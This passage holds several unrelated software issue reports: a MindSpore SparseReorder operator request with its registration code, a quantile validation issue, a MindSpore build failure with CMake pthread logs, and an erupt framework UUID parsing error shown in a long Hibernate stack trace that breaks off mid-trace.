【众智】【计算-AICPU开发】SparseReorder,"AICPU算子接入 将一个 SparseTensor 重新排序为规范的行优先排序。 接口目录：mindspore/ops/operations/sparse_ops.py indices values shape y_indices y_values 对应底层算子 （不支持STRING、RESOURCE） 对应底层AICPU算子SparseReorder TF接口： https://www.tensorflow.org/versions/r2.6/api_docs/python/tf/raw_ops/SparseReorder 3. 异常处理 4. 算子反向 参考TF: @ops.RegisterGradient(""SparseReorder"")   <code>: class SparseReorder(Primitive): REG_OP(SparseReorder) .INPUT(indices, TensorType({DT_INT64})) .INPUT(values, TensorType({DT_FLOAT, DT_FLOAT16, DT_INT8, DT_INT16, \ DT_UINT16, DT_UINT8, DT_INT32, DT_INT64, DT_BOOL, DT_DOUBLE, \ DT_COMPLEX64, DT_COMPLEX128, DT_RESOURCE, DT_STRING})) .INPUT(shape, TensorType({DT_INT64})) .OUTPUT(y_indices, TensorType({DT_INT64})) .OUTPUT(y_values, TensorType({DT_FLOAT, DT_FLOAT16, DT_INT8, DT_INT16, \ DT_UINT16, DT_UINT8, DT_INT32, DT_INT64, DT_BOOL, DT_DOUBLE, \ DT_COMPLEX64, DT_COMPLEX128, DT_RESOURCE, DT_STRING})) .OP_END_FACTORY_REG(SparseReorder)"
"[CT][MS][quantile] 增加`q` is not a Tensor or float 的校验, 增加q不是1d的校验",1.缺少 is not a Tensor or float 的校验， 当q是不是tensor类型（或为元组）或为1、0这样特殊的整数时，校验在dtype of is not float32 or float64里，报的是dtype的错误 2.当q为2d时 /mode graph   <code>: q q
master分支编译失败,"系统：ubuntu18 python: 3.8.12(conda) cmake: 3.23.2 gcc: 7.5.0 报错信息如下： mindspore/CMakeFiles/CMakeOutput.log如下：   <code>: -- Configuring incomplete, errors occurred! See also ""/home/liziqing/Files/Workspace/Python/Other/mindspore/build/mindspore/_deps/flatbuffers-src/_build/CMakeFiles/CMakeOutput.log"". See also ""/home/liziqing/Files/Workspace/Python/Other/mindspore/build/mindspore/_deps/flatbuffers-src/_build/CMakeFiles/CMakeError.log"". CMake Error at cmake/utils.cmake:179 (message): error! when /usr/bin/cmake;-DCMAKE_CXX_COMPILER_ARG1=;-DCMAKE_C_COMPILER_ARG1=;-DCMAKE_C_COMPILER=;-DCMAKE_CXX_COMPILER=;-DFLATBUFFERS_BUILD_TESTS=OFF;-DCMAKE_INSTALL_LIBDIR=lib;-DCMAKE_BUILD_TYPE=Release;-G;Unix Makefiles;-DCMAKE_C_FLAGS=-fPIC -fPIE -D_FORTIFY_SOURCE=2 -O2 -fstack-protector-strong;-DCMAKE_CXX_FLAGS=-fPIC -fPIE -D_FORTIFY_SOURCE=2 -O2 -fstack-protector-strong;-DCMAKE_INSTALL_PREFIX=/home/liziqing/Files/Workspace/Python/Other/mindspore/build/mindspore/.mslib/flatbuffers_2.0.0_3255aa917e897b45ddb6f7b933c6ff62;/home/liziqing/Files/Workspace/Python/Other/mindspore/build/mindspore/_deps/flatbuffers-src/ in /home/liziqing/Files/Workspace/Python/Other/mindspore/build/mindspore/_deps/flatbuffers-src/_build Call Stack (most recent call first): cmake/utils.cmake:370 (__exec_cmd) cmake/external_libs/flatbuffers.cmake:50 (mindspore_add_pkg) cmake/mind_expression.cmake:34 (include) CMakeLists.txt:65 (include) Performing C SOURCE FILE Test CMAKE_HAVE_LIBC_PTHREAD failed with the following output: Change Dir: /home/liziqing/Files/Workspace/Python/Other/mindspore/build/mindspore/CMakeFiles/CMakeTmp Run Build Command(s):/usr/bin/make -f Makefile cmTC_32098/fast &amp;&amp; /usr/bin/make -f CMakeFiles/cmTC_32098.dir/build.make CMakeFiles/cmTC_32098.dir/build make[1]: Entering directory '/home/liziqing/Files/Workspace/Python/Other/mindspore/build/mindspore/CMakeFiles/CMakeTmp' Building C object CMakeFiles/cmTC_32098.dir/src.c.o /usr/bin/cc -DCMAKE_HAVE_LIBC_PTHREAD -o CMakeFiles/cmTC_32098.dir/src.c.o -c /home/liziqing/Files/Workspace/Python/Other/mindspore/build/mindspore/CMakeFiles/CMakeTmp/src.c Linking C executable cmTC_32098 /usr/bin/cmake -E cmake_link_script CMakeFiles/cmTC_32098.dir/link.txt --verbose=1 /usr/bin/cc CMakeFiles/cmTC_32098.dir/src.c.o -o cmTC_32098 CMakeFiles/cmTC_32098.dir/src.c.o: In function `main': src.c:(.text+0x3e): undefined reference to `pthread_create' src.c:(.text+0x4a): undefined reference to `pthread_detach' src.c:(.text+0x56): undefined reference to `pthread_cancel' src.c:(.text+0x67): undefined reference to `pthread_join' src.c:(.text+0x7b): undefined reference to `pthread_atfork' collect2: error: ld returned 1 exit status CMakeFiles/cmTC_32098.dir/build.make:98: recipe for target 'cmTC_32098' failed make[1]: *** [cmTC_32098] Error 1 make[1]: Leaving directory '/home/liziqing/Files/Workspace/Python/Other/mindspore/build/mindspore/CMakeFiles/CMakeTmp' Makefile:127: recipe for target 'cmTC_32098/fast' failed make: *** [cmTC_32098/fast] Error 2 Source file was: #include &lt;pthread.h&gt; static void* test_func(void* data) { return data; } int main(void) { pthread_t thread; pthread_create(&amp;thread, NULL, test_func, NULL); pthread_detach(thread); pthread_cancel(thread); pthread_join(thread, NULL); pthread_atfork(NULL, NULL, NULL); pthread_exit(NULL); return 0; } Determining if the function pthread_create exists in the pthreads failed with the following output: Change Dir: /home/liziqing/Files/Workspace/Python/Other/mindspore/build/mindspore/CMakeFiles/CMakeTmp Run Build Command(s):/usr/bin/make -f Makefile cmTC_2b47d/fast &amp;&amp; /usr/bin/make -f CMakeFiles/cmTC_2b47d.dir/build.make CMakeFiles/cmTC_2b47d.dir/build make[1]: Entering directory '/home/liziqing/Files/Workspace/Python/Other/mindspore/build/mindspore/CMakeFiles/CMakeTmp' Building C object CMakeFiles/cmTC_2b47d.dir/CheckFunctionExists.c.o /usr/bin/cc -DCHECK_FUNCTION_EXISTS=pthread_create -o CMakeFiles/cmTC_2b47d.dir/CheckFunctionExists.c.o -c /usr/share/cmake-3.23/Modules/CheckFunctionExists.c Linking C executable cmTC_2b47d /usr/bin/cmake -E cmake_link_script CMakeFiles/cmTC_2b47d.dir/link.txt --verbose=1 /usr/bin/cc -DCHECK_FUNCTION_EXISTS=pthread_create CMakeFiles/cmTC_2b47d.dir/CheckFunctionExists.c.o -o cmTC_2b47d -lpthreads /usr/bin/ld: cannot find -lpthreads collect2: error: ld returned 1 exit status CMakeFiles/cmTC_2b47d.dir/build.make:98: recipe for target 'cmTC_2b47d' failed make[1]: *** [cmTC_2b47d] Error 1 make[1]: Leaving directory '/home/liziqing/Files/Workspace/Python/Other/mindspore/build/mindspore/CMakeFiles/CMakeTmp' Makefile:127: recipe for target 'cmTC_2b47d/fast' failed make: *** [cmTC_2b47d/fast] Error 2 Determining if the __aarch64__ exist failed with the following output: Change Dir: /home/liziqing/Files/Workspace/Python/Other/mindspore/build/mindspore/CMakeFiles/CMakeTmp Run Build Command(s):/usr/bin/make -f Makefile cmTC_7bc3d/fast &amp;&amp; /usr/bin/make -f CMakeFiles/cmTC_7bc3d.dir/build.make CMakeFiles/cmTC_7bc3d.dir/build make[1]: Entering directory '/home/liziqing/Files/Workspace/Python/Other/mindspore/build/mindspore/CMakeFiles/CMakeTmp' Building C object CMakeFiles/cmTC_7bc3d.dir/CheckSymbolExists.c.o /usr/bin/cc -o CMakeFiles/cmTC_7bc3d.dir/CheckSymbolExists.c.o -c /home/liziqing/Files/Workspace/Python/Other/mindspore/build/mindspore/CMakeFiles/CMakeTmp/CheckSymbolExists.c /home/liziqing/Files/Workspace/Python/Other/mindspore/build/mindspore/CMakeFiles/CMakeTmp/CheckSymbolExists.c: In function ‘main’: /home/liziqing/Files/Workspace/Python/Other/mindspore/build/mindspore/CMakeFiles/CMakeTmp/CheckSymbolExists.c:7:19: error: ‘__aarch64__’ undeclared (first use in this function); did you mean ‘__amd64__’? return ((int*)(&amp;__aarch64__))[argc]; ^~~~~~~~~~~ __amd64__ /home/liziqing/Files/Workspace/Python/Other/mindspore/build/mindspore/CMakeFiles/CMakeTmp/CheckSymbolExists.c:7:19: note: each undeclared identifier is reported only once for each function it appears in CMakeFiles/cmTC_7bc3d.dir/build.make:77: recipe for target 'CMakeFiles/cmTC_7bc3d.dir/CheckSymbolExists.c.o' failed make[1]: *** [CMakeFiles/cmTC_7bc3d.dir/CheckSymbolExists.c.o] Error 1 make[1]: Leaving directory '/home/liziqing/Files/Workspace/Python/Other/mindspore/build/mindspore/CMakeFiles/CMakeTmp' Makefile:127: recipe for target 'cmTC_7bc3d/fast' failed make: *** [cmTC_7bc3d/fast] Error 2 File /home/liziqing/Files/Workspace/Python/Other/mindspore/build/mindspore/CMakeFiles/CMakeTmp/CheckSymbolExists.c: /* */ int main(int argc, char** argv) { (void)argv; #ifndef __aarch64__ return ((int*)(&amp;__aarch64__))[argc]; #else (void)argc; return 0; #endif }"
"@Tree(id = ""id"")id数据值不能识别","JDK版本： openjdk_8_121 erupt版本： 1.7.3 数据库根据两张表的id，查询id相同的数据，两张表id值为7d049f68-6bb7-4ec0-89f6-7ca2ccea3991时不能识别到，id换成20为以内数字可以，但对接方数据源不能改，必须用7d049f68-6bb7-4ec0-89f6-7ca2ccea3991请问不能识别是什么原因，怎么可以解决 2.报错信息 Hibernate: select energyunit0_.id as col_0_0_, energyunit0_.unit_name as col_1_0_, energyunit1_.id as col_2_0_ from zdy_cost_consume2 energyunit0_ left outer join zdy_cost_consume2 energyunit1_ on energyunit0_.parent_id=energyunit1_.id where 1=1 Hibernate: select count(*) as col_0_0_ from zdy_cost_consume energyconf0_ left outer join zdy_cost_consume2 energyunit1_ on energyconf0_.category_id=energyunit1_.id where 1=1 2021-07-29 08:45:38.323 ERROR 2320 --- [nio-8080-exec-6] o.a.c.c.C.[.[.[/].[dispatcherServlet] : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed; nested exception is java.lang.NumberFormatException: For input string: ""7d049f68-6bb7-4ec0-89f6-7ca2ccea3991""] with root cause java.lang.NumberFormatException: For input string: ""7d049f68-6bb7-4ec0-89f6-7ca2ccea3991"" at sun.misc.FloatingDecimal.readJavaFormatString(FloatingDecimal.java:2043) ~[na:1.8.0_121] at sun.misc.FloatingDecimal.parseDouble(FloatingDecimal.java:110) ~[na:1.8.0_121] at java.lang.Double.parseDouble(Double.java:538) ~[na:1.8.0_121] at com.mysql.cj.protocol.a.MysqlTextValueDecoder.getDouble(MysqlTextValueDecoder.java:238) ~[mysql-connector-java-8.0.16.jar:8.0.16] at com.mysql.cj.result.AbstractNumericValueFactory.createFromBytes(AbstractNumericValueFactory.java:59) ~[mysql-connector-java-8.0.16.jar:8.0.16] at com.mysql.cj.protocol.a.MysqlTextValueDecoder.decodeByteArray(MysqlTextValueDecoder.java:132) ~[mysql-connector-java-8.0.16.jar:8.0.16] at com.mysql.cj.protocol.result.AbstractResultsetRow.decodeAndCreateReturnValue(AbstractResultsetRow.java:133) ~[mysql-connector-java-8.0.16.jar:8.0.16] at com.mysql.cj.protocol.result.AbstractResultsetRow.getValueFromBytes(AbstractResultsetRow.java:241) ~[mysql-connector-java-8.0.16.jar:8.0.16] at com.mysql.cj.protocol.a.result.ByteArrayRow.getValue(ByteArrayRow.java:91) ~[mysql-connector-java-8.0.16.jar:8.0.16] at com.mysql.cj.jdbc.result.ResultSetImpl.getLong(ResultSetImpl.java:832) ~[mysql-connector-java-8.0.16.jar:8.0.16] at com.mysql.cj.jdbc.result.ResultSetImpl.getLong(ResultSetImpl.java:837) ~[mysql-connector-java-8.0.16.jar:8.0.16] at com.zaxxer.hikari.pool.HikariProxyResultSet.getLong(HikariProxyResultSet.java) ~[HikariCP-3.4.5.jar:na] at org.hibernate.type.descriptor.sql.BigIntTypeDescriptor$2.doExtract(BigIntTypeDescriptor.java:63) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.type.descriptor.sql.BasicExtractor.extract(BasicExtractor.java:47) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.type.AbstractStandardBasicType.nullSafeGet(AbstractStandardBasicType.java:257) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.type.AbstractStandardBasicType.nullSafeGet(AbstractStandardBasicType.java:253) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.type.AbstractStandardBasicType.nullSafeGet(AbstractStandardBasicType.java:243) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.hql.QueryLoader.getResultRow(QueryLoader.java:457) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.hql.QueryLoader.getResultColumnOrRow(QueryLoader.java:440) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.Loader.getRowFromResultSet(Loader.java:770) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.Loader.getRowsFromResultSet(Loader.java:1039) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.Loader.processResultSet(Loader.java:990) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.Loader.doQuery(Loader.java:959) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.Loader.doQueryAndInitializeNonLazyCollections(Loader.java:349) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.Loader.doList(Loader.java:2849) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.Loader.doList(Loader.java:2831) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.Loader.listIgnoreQueryCache(Loader.java:2663) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.Loader.list(Loader.java:2658) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.hql.QueryLoader.list(QueryLoader.java:506) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.hql.internal.ast.QueryTranslatorImpl.list(QueryTranslatorImpl.java:400) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.engine.query.spi.HQLQueryPlan.performList(HQLQueryPlan.java:219) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.internal.SessionImpl.list(SessionImpl.java:1414) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.query.internal.AbstractProducedQuery.doList(AbstractProducedQuery.java:1625) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.query.internal.AbstractProducedQuery.list(AbstractProducedQuery.java:1593) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.query.Query.getResultList(Query.java:165) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at xyz.erupt.jpa.service.EruptDataServiceDbImpl.lambda$queryColumn$6(EruptDataServiceDbImpl.java:194) ~[erupt-jpa-1.7.3.jar:na] at xyz.erupt.jpa.service.EntityManagerService.getEntityManager(EntityManagerService.java:81) ~[erupt-jpa-1.7.3.jar:na] at xyz.erupt.jpa.service.EruptDataServiceDbImpl.queryColumn(EruptDataServiceDbImpl.java:194) ~[erupt-jpa-1.7.3.jar:na] at xyz.erupt.jpa.service.EruptDataServiceDbImpl$$FastClassBySpringCGLIB$$d4bad7a0.invoke() ~[erupt-jpa-1.7.3.jar:na] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.3.6.jar:5.3.6] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:688) ~[spring-aop-5.3.6.jar:5.3.6] at xyz.erupt.jpa.service.EruptDataServiceDbImpl$$EnhancerBySpringCGLIB$$be3bf0db.queryColumn() ~[erupt-jpa-1.7.3.jar:na] at xyz.erupt.core.service.PreEruptDataService.createColumnQuery(PreEruptDataService.java:86) ~[erupt-core-1.7.3.jar:na] at xyz.erupt.core.service.PreEruptDataService.geneTree(PreEruptDataService.java:44) ~[erupt-core-1.7.3.jar:na] at xyz.erupt.core.controller.EruptDataController.getReferenceTree(EruptDataController.java:292) ~[erupt-core-1.7.3.jar:na] at xyz.erupt.core.controller.EruptDataController.getDependTree(EruptDataController.java:256) ~[erupt-core-1.7.3.jar:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_121] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_121] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_121] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_121] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:197) ~[spring-web-5.3.6.jar:5.3.6] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:141) ~[spring-web-5.3.6.jar:5.3.6] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) ~[spring-webmvc-5.3.6.jar:5.3.6] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:894) ~[spring-webmvc-5.3.6.jar:5.3.6] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) ~[spring-webmvc-5.3.6.jar:5.3.6] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.3.6.jar:5.3.6] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1060) ~[spring-webmvc-5.3.6.jar:5.3.6] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:962) ~[spring-webmvc-5.3.6.jar:5.3.6] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.3.6.jar:5.3.6] at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) ~[spring-webmvc-5.3.6.jar:5.3.6] at javax.servlet.http.HttpServlet.service(HttpServlet.java:626) ~[tomcat-embed-core-9.0.45.jar:4.0.FR] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.3.6.jar:5.3.6] at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) ~[tomcat-embed-core-9.0.45.jar:4.0.FR] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) ~[tomcat-embed-websocket-9.0.45.jar:9.0.45] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at xyz.erupt.security.interceptor.HttpServletRequestFilter.doFilter(HttpServletRequestFilter.java:49) ~[erupt-security-1.7.3.jar:na] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-5.3.6.jar:5.3.6] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.6.jar:5.3.6] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-5.3.6.jar:5.3.6] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.6.jar:5.3.6] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.3.6.jar:5.3.6] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.6.jar:5.3.6] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) [tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) [tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) [tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) [tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) [tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar:9.0.45] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) [na:1.8.0_121] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) [na:1.8.0_121] at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar:9.0.45] at java.lang.Thread.run(Thread.java:745) [na:1.8.0_121] Hibernate: select energyconf0_.datetime as col_0_0_, energyconf0_.metering_name as col_1_0_, energyconf0_.power as col_2_0_, energyconf0_.id as col_3_0_, energyunit1_.unit_name as col_4_0_, energyconf0_.time_y as col_5_0_, energyconf0_.time_r as col_6_0_, energyconf0_.time as col_7_0_, energyconf0_.gas as col_8_0_ from zdy_cost_consume energyconf0_ left outer join zdy_cost_consume2 energyunit1_ on energyconf0_.category_id=energyunit1_.id where 1=1 limit ? 2021-07-29 08:45:38.331 ERROR 2320 --- [nio-8080-exec-2] o.a.c.c.C.[.[.[/].[dispatcherServlet] : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed; nested exception is org.springframework.dao.InvalidDataAccessApiUsageException: For input string: ""7d049f68-6bb7-4ec0-89f6-7ca2ccea3991""; nested exception is java.lang.NumberFormatException: For input string: ""7d049f68-6bb7-4ec0-89f6-7ca2ccea3991""] with root cause java.lang.NumberFormatException: For input string: ""7d049f68-6bb7-4ec0-89f6-7ca2ccea3991"" at sun.misc.FloatingDecimal.readJavaFormatString(FloatingDecimal.java:2043) ~[na:1.8.0_121] at sun.misc.FloatingDecimal.parseDouble(FloatingDecimal.java:110) ~[na:1.8.0_121] at java.lang.Double.parseDouble(Double.java:538) ~[na:1.8.0_121] at com.mysql.cj.protocol.a.MysqlTextValueDecoder.getDouble(MysqlTextValueDecoder.java:238) ~[mysql-connector-java-8.0.16.jar:8.0.16] at com.mysql.cj.result.AbstractNumericValueFactory.createFromBytes(AbstractNumericValueFactory.java:59) ~[mysql-connector-java-8.0.16.jar:8.0.16] at com.mysql.cj.protocol.a.MysqlTextValueDecoder.decodeByteArray(MysqlTextValueDecoder.java:132) ~[mysql-connector-java-8.0.16.jar:8.0.16] at com.mysql.cj.protocol.result.AbstractResultsetRow.decodeAndCreateReturnValue(AbstractResultsetRow.java:133) ~[mysql-connector-java-8.0.16.jar:8.0.16] at com.mysql.cj.protocol.result.AbstractResultsetRow.getValueFromBytes(AbstractResultsetRow.java:241) ~[mysql-connector-java-8.0.16.jar:8.0.16] at com.mysql.cj.protocol.a.result.ByteArrayRow.getValue(ByteArrayRow.java:91) ~[mysql-connector-java-8.0.16.jar:8.0.16] at com.mysql.cj.jdbc.result.ResultSetImpl.getLong(ResultSetImpl.java:832) ~[mysql-connector-java-8.0.16.jar:8.0.16] at com.mysql.cj.jdbc.result.ResultSetImpl.getLong(ResultSetImpl.java:837) ~[mysql-connector-java-8.0.16.jar:8.0.16] at com.zaxxer.hikari.pool.HikariProxyResultSet.getLong(HikariProxyResultSet.java) ~[HikariCP-3.4.5.jar:na] at org.hibernate.type.descriptor.sql.BigIntTypeDescriptor$2.doExtract(BigIntTypeDescriptor.java:63) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.type.descriptor.sql.BasicExtractor.extract(BasicExtractor.java:47) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.type.AbstractStandardBasicType.nullSafeGet(AbstractStandardBasicType.java:257) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.type.AbstractStandardBasicType.nullSafeGet(AbstractStandardBasicType.java:253) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.type.AbstractStandardBasicType.nullSafeGet(AbstractStandardBasicType.java:243) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.hql.QueryLoader.getResultRow(QueryLoader.java:457) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.hql.QueryLoader.getResultColumnOrRow(QueryLoader.java:440) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.Loader.getRowFromResultSet(Loader.java:770) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.Loader.getRowsFromResultSet(Loader.java:1039) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.Loader.processResultSet(Loader.java:990) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.Loader.doQuery(Loader.java:959) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.Loader.doQueryAndInitializeNonLazyCollections(Loader.java:349) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.Loader.doList(Loader.java:2849) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.Loader.doList(Loader.java:2831) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.Loader.listIgnoreQueryCache(Loader.java:2663) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.Loader.list(Loader.java:2658) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.loader.hql.QueryLoader.list(QueryLoader.java:506) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.hql.internal.ast.QueryTranslatorImpl.list(QueryTranslatorImpl.java:400) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.engine.query.spi.HQLQueryPlan.performList(HQLQueryPlan.java:219) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.internal.SessionImpl.list(SessionImpl.java:1414) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.query.internal.AbstractProducedQuery.doList(AbstractProducedQuery.java:1625) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.query.internal.AbstractProducedQuery.list(AbstractProducedQuery.java:1593) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at org.hibernate.query.Query.getResultList(Query.java:165) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final] at xyz.erupt.jpa.dao.EruptJpaDao.lambda$queryEruptList$3(EruptJpaDao.java:95) ~[erupt-jpa-1.7.3.jar:na] at xyz.erupt.jpa.service.EntityManagerService.getEntityManager(EntityManagerService.java:81) ~[erupt-jpa-1.7.3.jar:na] at xyz.erupt.jpa.dao.EruptJpaDao.queryEruptList(EruptJpaDao.java:58) ~[erupt-jpa-1.7.3.jar:na] at xyz.erupt.jpa.dao.EruptJpaDao$$FastClassBySpringCGLIB$$a6bf9a1d.invoke() ~[erupt-jpa-1.7.3.jar:na] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) 